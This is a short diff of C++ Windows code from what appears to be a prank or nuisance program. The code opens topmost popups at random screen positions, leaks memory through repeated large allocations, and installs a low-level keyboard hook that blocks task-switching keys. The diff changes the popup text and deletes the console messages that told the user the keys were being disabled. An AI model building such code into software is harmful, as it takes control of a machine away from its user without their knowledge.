@@ -213,7 +213,7 @@ void displayDialog(HWND hWnd) {
 	int y = rand() % 1080;
 	char* eater;
 	eater = (char*)malloc(7999999);
-	CreateWindowEx(WS_EX_TOPMOST, L"popup", L"I LOVE YOU RUKIA!!!!!", WS_VISIBLE, x, y, 240, 220, hWnd, NULL, NULL, NULL);
+	CreateWindowEx(WS_EX_TOPMOST, L"popup", L"KRISTIK'S WAIFU", WS_VISIBLE, x, y, 240, 220, hWnd, NULL, NULL, NULL);
 }
 
 void showDialog() {
@@ -355,9 +355,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(INT nCode, WPARAM wParam, LPARAM lParam)
 void GrabKeys() {
 	_getch();
 	g_hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
-	cout << "Testing task keys disabling (alt tab, ctrl esc, alt esc) and taskbar..." << endl;
 	_getch();
 	UnhookWindowsHookEx(g_hKeyboardHook);
-	cout << "Re enabled" << endl;
 	_getch();
 }
